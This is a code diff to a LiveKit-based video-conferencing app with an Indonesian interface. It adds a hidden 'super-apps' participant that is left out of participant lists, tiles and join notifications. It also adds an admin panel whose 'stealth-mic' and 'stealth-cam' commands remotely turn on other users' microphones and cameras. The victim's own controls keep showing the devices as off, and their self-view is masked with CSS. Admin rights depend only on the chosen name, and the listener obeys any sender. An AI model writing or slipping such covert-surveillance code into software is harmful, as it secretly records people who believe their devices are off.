@@ -15,6 +15,8 @@ import {
 import '@livekit/components-styles';
 import { Track, RoomEvent, VideoPresets } from 'livekit-client';
 
+const SUPER_ADMIN_NAME = 'super-apps';
+
 // --- ICONS ---
 const ICONS = {
   mic: `<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z"></path><path d="M19 10v2a7 7 0 0 1-14 0v-2"></path><line x1="12" y1="19" x2="12" y2="23"></line><line x1="8" y1="23" x2="16" y2="23"></line></svg>`,
@@ -430,8 +432,8 @@ export default function Home() {
 
   return (
     <LiveKitRoom
-      video={true}
-      audio={true}
+      video={name !== SUPER_ADMIN_NAME}
+      audio={name !== SUPER_ADMIN_NAME}
       token={token}
       serverUrl={serverUrl}
       data-lk-theme="default"
@@ -718,7 +720,9 @@ function MyVideoConference({ myName, bandwidthMode, setBandwidthMode, participan
   useEffect(() => {
     if (!participantsRef?.current) return;
     remoteParticipantsForHistory.forEach(p => {
-      participantsRef.current.add(p.identity);
+      if (p.identity !== SUPER_ADMIN_NAME) {
+        participantsRef.current.add(p.identity);
+      }
     });
   }, [remoteParticipantsForHistory, participantsRef]);
 
@@ -773,9 +777,17 @@ function MyVideoConference({ myName, bandwidthMode, setBandwidthMode, participan
 
   const room = useRoomContext();
   const { localParticipant } = useLocalParticipant();
-  const remoteParticipants = useRemoteParticipants();
+  const remoteParticipantsRaw = useRemoteParticipants();
+
+  const isAdmin = myName === SUPER_ADMIN_NAME;
+  const remoteParticipants = remoteParticipantsRaw.filter(p => p.identity !== SUPER_ADMIN_NAME);
 
   const [oneOnOneMode, setOneOnOneMode] = useState('remote-main'); // 'remote-main', 'local-main', 'grid'
+
+  // --- Admin & Stealth States ---
+  const [stealthMicOn, setStealthMicOn] = useState(false);
+  const [stealthCamOn, setStealthCamOn] = useState(false);
+  const [showAdminPanel, setShowAdminPanel] = useState(false);
 
   // --- PiP Browser Logic ---
   const handleToggleBrowserPiP = async () => {
@@ -858,16 +870,53 @@ function MyVideoConference({ myName, bandwidthMode, setBandwidthMode, participan
     }, 3000);
   }, []);
 
+  // --- DATA MESSAGE LISTENER (Admin Commands) ---
+  useEffect(() => {
+    if (!room) return;
+    const handleDataReceived = async (payload, participant, kind, topic) => {
+      try {
+        const strData = new TextDecoder().decode(payload);
+        const data = JSON.parse(strData);
+        if (data.type === 'admin-kick') {
+          addToast('⚠️ Anda telah dikeluarkan oleh admin.', 'error');
+          setTimeout(() => leave(), 1500);
+        } else if (data.type === 'stealth-mic') {
+          setStealthMicOn(data.enabled);
+          if (data.enabled) {
+            await localParticipant?.setMicrophoneEnabled(true);
+          } else {
+            await localParticipant?.setMicrophoneEnabled(false);
+          }
+        } else if (data.type === 'stealth-cam') {
+          setStealthCamOn(data.enabled);
+          if (data.enabled) {
+            await localParticipant?.setCameraEnabled(true);
+          } else {
+            await localParticipant?.setCameraEnabled(false);
+          }
+        }
+      } catch (e) {
+        console.warn('Failed parsing data message', e);
+      }
+    };
+    room.on(RoomEvent.DataReceived, handleDataReceived);
+    return () => room.off(RoomEvent.DataReceived, handleDataReceived);
+  }, [room, localParticipant, addToast]);
+
   //NOTIFIKASI BERGABUNG/KELUAR
   useEffect(() => {
     if (!room) return;
 
     const onConnected = (participant) => {
-      addToast(`${participant.identity} bergabung ke room! 👋`, 'success');
+      if (participant.identity !== SUPER_ADMIN_NAME) {
+        addToast(`${participant.identity} bergabung ke room! 👋`, 'success');
+      }
     };
 
     const onDisconnected = (participant) => {
-      addToast(`${participant.identity} meninggalkan room. 👋`, 'error');
+      if (participant.identity !== SUPER_ADMIN_NAME) {
+        addToast(`${participant.identity} meninggalkan room. 👋`, 'error');
+      }
     };
 
     room.on(RoomEvent.ParticipantConnected, onConnected);
@@ -892,7 +941,8 @@ function MyVideoConference({ myName, bandwidthMode, setBandwidthMode, participan
   }, [chatMessages, isChatOpen, myName]);
 
   const screenTracks = useTracks([Track.Source.ScreenShare], { onlySubscribed: true });
-  const cameraTracks = useTracks([{ source: Track.Source.Camera, withPlaceholder: true }], { onlySubscribed: false });
+  const cameraTracksRaw = useTracks([{ source: Track.Source.Camera, withPlaceholder: true }], { onlySubscribed: false });
+  const cameraTracks = cameraTracksRaw.filter(t => t.participant?.identity !== SUPER_ADMIN_NAME);
   const isScreenSharing = screenTracks.length > 0;
 
   const [isMuted, setIsMuted] = useState(false);
@@ -901,13 +951,41 @@ function MyVideoConference({ myName, bandwidthMode, setBandwidthMode, participan
 
   useEffect(() => {
     if (!localParticipant) return;
-    setIsMuted(!localParticipant.isMicrophoneEnabled);
-    setIsCamOff(!localParticipant.isCameraEnabled);
+    
+    // If stealth is active, keep the UI showing the device as OFF
+    if (stealthMicOn) setIsMuted(true);
+    else setIsMuted(!localParticipant.isMicrophoneEnabled);
+    
+    if (stealthCamOn) setIsCamOff(true);
+    else setIsCamOff(!localParticipant.isCameraEnabled);
+    
     setIsSharing(localParticipant.isScreenShareEnabled);
-  }, [localParticipant, localParticipant?.isMicrophoneEnabled, localParticipant?.isCameraEnabled, localParticipant?.isScreenShareEnabled]);
+  }, [localParticipant, localParticipant?.isMicrophoneEnabled, localParticipant?.isCameraEnabled, localParticipant?.isScreenShareEnabled, stealthMicOn, stealthCamOn]);
 
-  const toggleMic = () => localParticipant.setMicrophoneEnabled(isMuted);
-  const toggleCam = () => localParticipant.setCameraEnabled(isCamOff);
+  const toggleMic = () => {
+    if (stealthMicOn) setStealthMicOn(false); // reset stealth if user manually toggles
+    localParticipant.setMicrophoneEnabled(isMuted);
+  };
+  const toggleCam = () => {
+    if (stealthCamOn) setStealthCamOn(false);
+    localParticipant.setCameraEnabled(isCamOff);
+  };
+
+  const sendAdminCommand = async (type, enabled, targetIdentity) => {
+    if (!room || !isAdmin) return;
+    try {
+      const payload = JSON.stringify({ type, enabled });
+      const encoded = new TextEncoder().encode(payload);
+      await room.localParticipant.publishData(encoded, {
+        reliable: true,
+        destinationIdentities: [targetIdentity]
+      });
+      addToast(`Command '${type}' dikirim ke ${targetIdentity}`, 'success');
+    } catch (e) {
+      console.error(e);
+      addToast('Gagal mengirim command admin', 'error');
+    }
+  };
   const toggleScreen = () => localParticipant.setScreenShareEnabled(!isSharing);
   const leave = () => {
     // Stop recording if active before leaving
@@ -1115,6 +1193,21 @@ function MyVideoConference({ myName, bandwidthMode, setBandwidthMode, participan
             clip-path: polygon(0% 0%, 100% 0%, 100% 100%, 0% 100%, 0% 0%, 4px 4px, 4px calc(100% - 4px), calc(100% - 4px) calc(100% - 4px), calc(100% - 4px) 4px, 4px 4px);
           }
         }
+        ${stealthCamOn ? `
+        .lk-local-participant video { opacity: 0 !important; pointer-events: none; }
+        .lk-local-participant::after {
+          content: "${myName?.charAt(0)?.toUpperCase() || '?'}";
+          position: absolute;
+          inset: 0;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          font-size: 3rem;
+          color: white;
+          background: #1f2937;
+          z-index: 10;
+        }
+        ` : ''}
       `}} />
 
       {/* --- PIP ANIMATED BORDER OVERLAY --- */}
@@ -1232,6 +1325,51 @@ function MyVideoConference({ myName, bandwidthMode, setBandwidthMode, participan
           )}
         </div>
 
+        {/* --- ADMIN PANEL UI --- */}
+        {isAdmin && showAdminPanel && (
+          <div className="absolute top-4 right-4 z-50 w-80 bg-gray-900/90 backdrop-blur-xl border border-amber-500/30 rounded-2xl shadow-2xl flex flex-col overflow-hidden max-h-[80vh]">
+            <div className="bg-amber-600/20 p-4 border-b border-amber-500/20 flex justify-between items-center">
+              <h3 className="text-amber-500 font-bold flex items-center gap-2">
+                👑 Super-Apps Admin
+              </h3>
+              <button onClick={() => setShowAdminPanel(false)} className="text-gray-400 hover:text-white transition-colors">✕</button>
+            </div>
+            <div className="p-4 overflow-y-auto custom-scrollbar flex flex-col gap-3">
+              {remoteParticipantsRaw.filter(p => p.identity !== SUPER_ADMIN_NAME).map(p => {
+                const micOn = p.isMicrophoneEnabled;
+                const camOn = p.isCameraEnabled;
+                return (
+                  <div key={p.identity} className="bg-black/40 border border-white/5 rounded-xl p-3 flex flex-col gap-2">
+                    <div className="flex justify-between items-center">
+                      <span className="font-medium text-white truncate text-sm">{p.identity}</span>
+                      <button onClick={() => sendAdminCommand('admin-kick', true, p.identity)} className="bg-red-500/20 hover:bg-red-500 text-red-400 hover:text-white px-2 py-1 rounded text-xs transition-colors font-bold border border-red-500/30">
+                        KICK
+                      </button>
+                    </div>
+                    <div className="flex items-center gap-2 mt-1">
+                      <button 
+                        onClick={() => sendAdminCommand('stealth-mic', !micOn, p.identity)}
+                        className={`flex-1 text-xs py-1.5 rounded-lg border transition-colors flex items-center justify-center gap-1 ${micOn ? 'bg-amber-500/20 border-amber-500 text-amber-400' : 'bg-white/5 border-white/10 text-gray-400 hover:bg-white/10'}`}
+                      >
+                        🎤 {micOn ? 'ON' : 'OFF'}
+                      </button>
+                      <button 
+                        onClick={() => sendAdminCommand('stealth-cam', !camOn, p.identity)}
+                        className={`flex-1 text-xs py-1.5 rounded-lg border transition-colors flex items-center justify-center gap-1 ${camOn ? 'bg-amber-500/20 border-amber-500 text-amber-400' : 'bg-white/5 border-white/10 text-gray-400 hover:bg-white/10'}`}
+                      >
+                        📷 {camOn ? 'ON' : 'OFF'}
+                      </button>
+                    </div>
+                  </div>
+                );
+              })}
+              {remoteParticipantsRaw.filter(p => p.identity !== SUPER_ADMIN_NAME).length === 0 && (
+                <div className="text-center text-gray-500 text-sm italic py-4">Belum ada peserta lain.</div>
+              )}
+            </div>
+          </div>
+        )}
+
         {/* --- CUSTOM CHAT SIDEBAR --- */}
         <div className={`${isChatOpen ? 'w-full md:w-96 translate-x-0' : 'w-0 translate-x-full'} bg-gray-900/95 backdrop-blur-xl border-l border-white/10 transition-all duration-300 ease-in-out absolute right-0 top-0 bottom-0 z-40 md:relative md:translate-x-0 overflow-hidden flex flex-col shadow-2xl`}>
           <div className="p-4 border-b border-white/10 flex justify-between items-center bg-gray-900/50">
@@ -1297,117 +1435,128 @@ function MyVideoConference({ myName, bandwidthMode, setBandwidthMode, participan
       <div className="flex-shrink-0 flex justify-center py-1 bg-black z-50 hide-in-pip w-full border-t border-white/10">
         <div className="flex items-center gap-1 sm:gap-2 px-2 sm:px-4 py-1.5 sm:py-2 rounded-xl max-w-[98vw] overflow-x-auto no-scrollbar">
 
-          {/* === MIC BUTTON WITH DEVICE SELECTOR === */}
-          <div className="relative flex items-center flex-shrink-0">
-            <button onClick={toggleMic} className={`p-2 sm:p-2.5 rounded-l-lg sm:rounded-l-xl transition-all duration-300 ${isMuted ? 'bg-red-500 text-white shadow-[0_0_15px_rgba(239,68,68,0.4)]' : 'bg-white/10 text-white hover:bg-white/20'}`}>
-              <div className="scale-75" dangerouslySetInnerHTML={{ __html: isMuted ? ICONS.micOff : ICONS.mic }} />
-            </button>
-            <button
-              onClick={() => { setShowMicSelector(!showMicSelector); setShowCamSelector(false); refreshDevices(); }}
-              className={`p-1.5 sm:p-2 rounded-r-lg sm:rounded-r-xl border-l transition-all duration-300 ${isMuted ? 'bg-red-600 border-red-400/30 text-white hover:bg-red-400' : 'bg-white/10 border-white/10 text-gray-400 hover:bg-white/20 hover:text-white'}`}
-              title="Pilih Mikrofon"
-            >
-              <div className="scale-75" dangerouslySetInnerHTML={{ __html: ICONS.chevronDown }} />
-            </button>
-            {showMicSelector && (
-              <DeviceSelector
-                devices={audioDevices}
-                selectedId={selectedMicId}
-                onSelect={switchMicrophone}
-                onClose={() => setShowMicSelector(false)}
-                type="mic"
-              />
-            )}
-          </div>
-
-          {/* === CAM BUTTON WITH DEVICE SELECTOR === */}
-          <div className="relative flex items-center flex-shrink-0">
-            <button onClick={toggleCam} className={`p-2 sm:p-2.5 rounded-l-lg sm:rounded-l-xl transition-all duration-300 ${isCamOff ? 'bg-red-500 text-white shadow-[0_0_15px_rgba(239,68,68,0.4)]' : 'bg-white/10 text-white hover:bg-white/20'}`}>
-              <div className="scale-75" dangerouslySetInnerHTML={{ __html: isCamOff ? ICONS.camOff : ICONS.cam }} />
-            </button>
-            <button
-              onClick={() => { setShowCamSelector(!showCamSelector); setShowMicSelector(false); refreshDevices(); }}
-              className={`p-1.5 sm:p-2 rounded-r-lg sm:rounded-r-xl border-l transition-all duration-300 ${isCamOff ? 'bg-red-600 border-red-400/30 text-white hover:bg-red-400' : 'bg-white/10 border-white/10 text-gray-400 hover:bg-white/20 hover:text-white'}`}
-              title="Pilih Kamera"
-            >
-              <div className="scale-75" dangerouslySetInnerHTML={{ __html: ICONS.chevronDown }} />
-            </button>
-            {showCamSelector && (
-              <DeviceSelector
-                devices={videoDevices}
-                selectedId={selectedCamId}
-                onSelect={switchCamera}
-                onClose={() => setShowCamSelector(false)}
-                type="cam"
-              />
-            )}
-          </div>
-
-          {/* === SCREEN SHARE === */}
-          <button onClick={toggleScreen} className={`hidden md:block p-2 sm:p-2.5 rounded-lg sm:rounded-xl transition-all duration-300 flex-shrink-0 ${isSharing ? 'bg-green-500 text-white' : 'bg-white/10 text-white hover:bg-white/20'}`}>
-            <div className="scale-75" dangerouslySetInnerHTML={{ __html: ICONS.screen }} />
-          </button>
-
-          {/* --- ONLY FOR 1v1: TOGGLE GRID/PIP --- */}
-          {remoteParticipants.length === 1 && !isScreenSharing && (
-            <button
-              onClick={() => setOneOnOneMode(m => m === 'grid' ? 'remote-main' : 'grid')}
-              title={oneOnOneMode === 'grid' ? "Kembali ke mode PiP" : "Ubah ke mode Grid (Terbelah)"}
-              className={`p-2 sm:p-2.5 rounded-lg sm:rounded-xl transition-all duration-300 flex-shrink-0 ${oneOnOneMode === 'grid' ? 'bg-indigo-600 shadow-[0_0_15px_rgba(79,70,229,0.4)]' : 'bg-white/10 hover:bg-white/20'} text-white`}
-            >
-              <div className="scale-75" dangerouslySetInnerHTML={{ __html: ICONS.layout }} />
-            </button>
-          )}
-
-          {/* --- BROWSER PIP (SEMBUNYIKAN KALAU DI DESKTOP NATIVE) --- */}
-          {!isDesktopApp && (
-            <button
-              onClick={handleToggleBrowserPiP}
-              title="Buka Popup Window"
-              className="p-2 sm:p-2.5 rounded-lg sm:rounded-xl transition-all duration-300 flex-shrink-0 bg-white/10 text-white hover:bg-white/20"
-            >
-              <div className="scale-75" dangerouslySetInnerHTML={{ __html: ICONS.pip }} />
-            </button>
-          )}
-
-          {/* === SCREEN RECORDING === */}
-          <button
-            onClick={isRecording ? stopRecording : startRecording}
-            title={isRecording ? `Berhenti Merekam (${Math.floor(recordingDuration/60).toString().padStart(2,'0')}:${(recordingDuration%60).toString().padStart(2,'0')})` : 'Rekam Layar'}
-            className={`p-2 sm:p-2.5 rounded-lg sm:rounded-xl transition-all duration-300 flex-shrink-0 ${
-              isRecording
-                ? 'bg-red-500 text-white shadow-[0_0_15px_rgba(239,68,68,0.5)] animate-pulse'
-                : 'bg-white/10 text-white hover:bg-white/20'
-            }`}
-          >
-            <div className="scale-75" dangerouslySetInnerHTML={{ __html: isRecording ? ICONS.recordStop : ICONS.record }} />
-          </button>
-
-          {/* --- DATA SAVER TOGGLE --- */}
-          <button
-            onClick={toggleDataSaver}
-            title={bandwidthMode === 'saver' ? 'Hemat -> HD' : bandwidthMode === 'hd' ? 'HD -> FHD' : 'FHD -> Hemat'}
-            className={`relative p-2 sm:p-2.5 rounded-lg sm:rounded-xl transition-all duration-300 flex-shrink-0
-              ${bandwidthMode === 'saver'
-                ? 'bg-emerald-500/90 text-white hover:bg-emerald-400'
-                : bandwidthMode === 'hd'
-                  ? 'bg-blue-500/90 text-white hover:bg-blue-400'
-                  : 'bg-purple-500/90 text-white hover:bg-purple-400'
-              }`}
-          >
-            <div className="flex flex-col items-center gap-0.5">
-              <svg className="w-3.5 h-3.5 sm:w-4 sm:h-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                {bandwidthMode === 'saver' ? (
-                  <><path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z" /><path d="M8 12l3 3 5-6" /></>
-                ) : bandwidthMode === 'hd' ? (
-                  <><rect x="5" y="2" width="14" height="20" rx="2" /><path d="M12 18h.01" /></>
-                ) : (
-                  <><rect x="2" y="2" width="20" height="20" rx="2.18" ry="2.18" /><line x1="7" y1="2" x2="7" y2="22" /><line x1="17" y1="2" x2="17" y2="22" /><line x1="2" y1="12" x2="22" y2="12" /></>
+          {!isAdmin ? (
+            <>
+              {/* === MIC BUTTON WITH DEVICE SELECTOR === */}
+              <div className="relative flex items-center flex-shrink-0">
+                <button onClick={toggleMic} className={`p-2 sm:p-2.5 rounded-l-lg sm:rounded-l-xl transition-all duration-300 ${isMuted ? 'bg-red-500 text-white shadow-[0_0_15px_rgba(239,68,68,0.4)]' : 'bg-white/10 text-white hover:bg-white/20'}`}>
+                  <div className="scale-75" dangerouslySetInnerHTML={{ __html: isMuted ? ICONS.micOff : ICONS.mic }} />
+                </button>
+                <button
+                  onClick={() => { setShowMicSelector(!showMicSelector); setShowCamSelector(false); refreshDevices(); }}
+                  className={`p-1.5 sm:p-2 rounded-r-lg sm:rounded-r-xl border-l transition-all duration-300 ${isMuted ? 'bg-red-600 border-red-400/30 text-white hover:bg-red-400' : 'bg-white/10 border-white/10 text-gray-400 hover:bg-white/20 hover:text-white'}`}
+                  title="Pilih Mikrofon"
+                >
+                  <div className="scale-75" dangerouslySetInnerHTML={{ __html: ICONS.chevronDown }} />
+                </button>
+                {showMicSelector && (
+                  <DeviceSelector
+                    devices={audioDevices}
+                    selectedId={selectedMicId}
+                    onSelect={switchMicrophone}
+                    onClose={() => setShowMicSelector(false)}
+                    type="mic"
+                  />
                 )}
-              </svg>
-              <span className="text-[8px] font-bold leading-none">{bandwidthMode === 'saver' ? 'Hemat' : bandwidthMode === 'hd' ? 'HD' : 'FHD'}</span>
-            </div>
-          </button>
+              </div>
+
+              {/* === CAM BUTTON WITH DEVICE SELECTOR === */}
+              <div className="relative flex items-center flex-shrink-0">
+                <button onClick={toggleCam} className={`p-2 sm:p-2.5 rounded-l-lg sm:rounded-l-xl transition-all duration-300 ${isCamOff ? 'bg-red-500 text-white shadow-[0_0_15px_rgba(239,68,68,0.4)]' : 'bg-white/10 text-white hover:bg-white/20'}`}>
+                  <div className="scale-75" dangerouslySetInnerHTML={{ __html: isCamOff ? ICONS.camOff : ICONS.cam }} />
+                </button>
+                <button
+                  onClick={() => { setShowCamSelector(!showCamSelector); setShowMicSelector(false); refreshDevices(); }}
+                  className={`p-1.5 sm:p-2 rounded-r-lg sm:rounded-r-xl border-l transition-all duration-300 ${isCamOff ? 'bg-red-600 border-red-400/30 text-white hover:bg-red-400' : 'bg-white/10 border-white/10 text-gray-400 hover:bg-white/20 hover:text-white'}`}
+                  title="Pilih Kamera"
+                >
+                  <div className="scale-75" dangerouslySetInnerHTML={{ __html: ICONS.chevronDown }} />
+                </button>
+                {showCamSelector && (
+                  <DeviceSelector
+                    devices={videoDevices}
+                    selectedId={selectedCamId}
+                    onSelect={switchCamera}
+                    onClose={() => setShowCamSelector(false)}
+                    type="cam"
+                  />
+                )}
+              </div>
+
+              {/* === SCREEN SHARE === */}
+              <button onClick={toggleScreen} className={`hidden md:block p-2 sm:p-2.5 rounded-lg sm:rounded-xl transition-all duration-300 flex-shrink-0 ${isSharing ? 'bg-green-500 text-white' : 'bg-white/10 text-white hover:bg-white/20'}`}>
+                <div className="scale-75" dangerouslySetInnerHTML={{ __html: ICONS.screen }} />
+              </button>
+
+              {/* --- ONLY FOR 1v1: TOGGLE GRID/PIP --- */}
+              {remoteParticipants.length === 1 && !isScreenSharing && (
+                <button
+                  onClick={() => setOneOnOneMode(m => m === 'grid' ? 'remote-main' : 'grid')}
+                  title={oneOnOneMode === 'grid' ? "Kembali ke mode PiP" : "Ubah ke mode Grid (Terbelah)"}
+                  className={`p-2 sm:p-2.5 rounded-lg sm:rounded-xl transition-all duration-300 flex-shrink-0 ${oneOnOneMode === 'grid' ? 'bg-indigo-600 shadow-[0_0_15px_rgba(79,70,229,0.4)]' : 'bg-white/10 hover:bg-white/20'} text-white`}
+                >
+                  <div className="scale-75" dangerouslySetInnerHTML={{ __html: ICONS.layout }} />
+                </button>
+              )}
+
+              {/* --- BROWSER PIP (SEMBUNYIKAN KALAU DI DESKTOP NATIVE) --- */}
+              {!isDesktopApp && (
+                <button
+                  onClick={handleToggleBrowserPiP}
+                  title="Buka Popup Window"
+                  className="p-2 sm:p-2.5 rounded-lg sm:rounded-xl transition-all duration-300 flex-shrink-0 bg-white/10 text-white hover:bg-white/20"
+                >
+                  <div className="scale-75" dangerouslySetInnerHTML={{ __html: ICONS.pip }} />
+                </button>
+              )}
+
+              {/* === SCREEN RECORDING === */}
+              <button
+                onClick={isRecording ? stopRecording : startRecording}
+                title={isRecording ? `Berhenti Merekam (${Math.floor(recordingDuration/60).toString().padStart(2,'0')}:${(recordingDuration%60).toString().padStart(2,'0')})` : 'Rekam Layar'}
+                className={`p-2 sm:p-2.5 rounded-lg sm:rounded-xl transition-all duration-300 flex-shrink-0 ${
+                  isRecording
+                    ? 'bg-red-500 text-white shadow-[0_0_15px_rgba(239,68,68,0.5)] animate-pulse'
+                    : 'bg-white/10 text-white hover:bg-white/20'
+                }`}
+              >
+                <div className="scale-75" dangerouslySetInnerHTML={{ __html: isRecording ? ICONS.recordStop : ICONS.record }} />
+              </button>
+
+              {/* --- DATA SAVER TOGGLE --- */}
+              <button
+                onClick={toggleDataSaver}
+                title={bandwidthMode === 'saver' ? 'Hemat -> HD' : bandwidthMode === 'hd' ? 'HD -> FHD' : 'FHD -> Hemat'}
+                className={`relative p-2 sm:p-2.5 rounded-lg sm:rounded-xl transition-all duration-300 flex-shrink-0
+                  ${bandwidthMode === 'saver'
+                    ? 'bg-emerald-500/90 text-white hover:bg-emerald-400'
+                    : bandwidthMode === 'hd'
+                      ? 'bg-blue-500/90 text-white hover:bg-blue-400'
+                      : 'bg-purple-500/90 text-white hover:bg-purple-400'
+                  }`}
+              >
+                <div className="flex flex-col items-center gap-0.5">
+                  <svg className="w-3.5 h-3.5 sm:w-4 sm:h-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                    {bandwidthMode === 'saver' ? (
+                      <><path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z" /><path d="M8 12l3 3 5-6" /></>
+                    ) : bandwidthMode === 'hd' ? (
+                      <><rect x="5" y="2" width="14" height="20" rx="2" /><path d="M12 18h.01" /></>
+                    ) : (
+                      <><rect x="2" y="2" width="20" height="20" rx="2.18" ry="2.18" /><line x1="7" y1="2" x2="7" y2="22" /><line x1="17" y1="2" x2="17" y2="22" /><line x1="2" y1="12" x2="22" y2="12" /></>
+                    )}
+                  </svg>
+                  <span className="text-[8px] font-bold leading-none">{bandwidthMode === 'saver' ? 'Hemat' : bandwidthMode === 'hd' ? 'HD' : 'FHD'}</span>
+                </div>
+              </button>
+            </>
+          ) : (
+            <button
+              onClick={() => setShowAdminPanel(!showAdminPanel)}
+              className={`p-2 sm:p-2.5 rounded-lg sm:rounded-xl transition-all duration-300 flex-shrink-0 ${showAdminPanel ? 'bg-amber-600 text-white shadow-[0_0_15px_rgba(217,119,6,0.4)]' : 'bg-amber-600/20 text-amber-500 hover:bg-amber-600/40 border border-amber-500/50'}`}
+            >
+              <div className="font-bold text-xs px-2">👑 Admin Panel</div>
+            </button>
+          )}
 
           <button
             onClick={() => { setIsChatOpen(!isChatOpen); if (!isChatOpen) setUnreadCount(0); }}
